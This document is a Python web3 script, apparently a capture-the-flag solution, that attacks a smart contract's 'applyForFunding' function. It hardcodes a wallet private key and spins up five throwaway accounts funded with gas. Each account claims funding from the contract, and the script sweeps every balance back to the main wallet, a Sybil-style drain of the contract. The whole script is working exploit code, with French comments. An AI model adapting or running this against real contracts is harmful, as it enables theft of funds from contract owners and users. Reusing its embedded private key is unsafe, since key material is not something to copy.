from web3 import Web3

rpc_url = "http://blockchain.bitskrieg.in:45726"
w3 = Web3(Web3.HTTPProvider(rpc_url))

assert w3.is_connected(), "❌ Connexion RCP refused"

main_wallet = "0x471DEEa245CAb263917A29BBe382d39DD23ccD21"
main_private_key = "0xdfd2ede15220488f155f3e9a87d1f5c4355ff79d108dc37ebe82ebdf2efefea5"

contract_address = "0x6a21F299fb0a001565315C2c07Fb88f68D455896"

contract_abi = [
    {
        "constant": False,
        "inputs": [{"name": "equityOffered", "type": "uint256"}],
        "name": "applyForFunding",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "isChallSolved",
        "outputs": [{"name": "", "type": "bool"}],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    }
]

contract = w3.eth.contract(address=contract_address, abi=contract_abi)

def check_wallet_balance(address):
    balance = w3.eth.get_balance(address)
    return w3.from_wei(balance, 'ether')

def generate_funded_accounts():
    funded_wallets = []
    
    for _ in range(5):
        new_account = w3.eth.account.create()
        funded_wallets.append(new_account)
        
        print(f" Nouveau compte généré: {new_account.address}")

        txn = {
            "from": main_wallet,
            "to": new_account.address,
            "value": w3.to_wei("0.02", "ether"),
            "gas": 21000,
            "gasPrice": w3.to_wei("5", "gwei"),
            "nonce": w3.eth.get_transaction_count(main_wallet),
        }

        signed_txn = w3.eth.account.sign_transaction(txn, main_private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
        print(f" Transfert de gas funds à {new_account.address}: {tx_hash.hex()}")

    return funded_wallets

def request_funding(funded_wallets):
    for account in funded_wallets:
        txn = contract.functions.applyForFunding(7).build_transaction({
            "from": account.address,
            "nonce": w3.eth.get_transaction_count(account.address),
            "gas": 200000,
            "gasPrice": w3.to_wei("5", "gwei"),
        })

        signed_txn = w3.eth.account.sign_transaction(txn, account.key)
        tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
        print(f" Demande de financement envoyée pour {account.address}: {tx_hash.hex()}")

def consolidate_funds(funded_wallets):
    for account in funded_wallets:
        balance = w3.eth.get_balance(account.address)

        if balance > 0:
            txn = {
                "from": account.address,
                "to": main_wallet,
                "value": balance - w3.to_wei("0.001", "ether"),
                "gas": 21000,
                "gasPrice": w3.to_wei("5", "gwei"),
                "nonce": w3.eth.get_transaction_count(account.address),
            }

            signed_txn = w3.eth.account.sign_transaction(txn, account.key)
            tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
            print(f" Transfert de fonds vers {main_wallet}: {tx_hash.hex()}")

wallets = generate_funded_accounts()
request_funding(wallets)
consolidate_funds(wallets)
print(check_wallet_balance(main_wallet))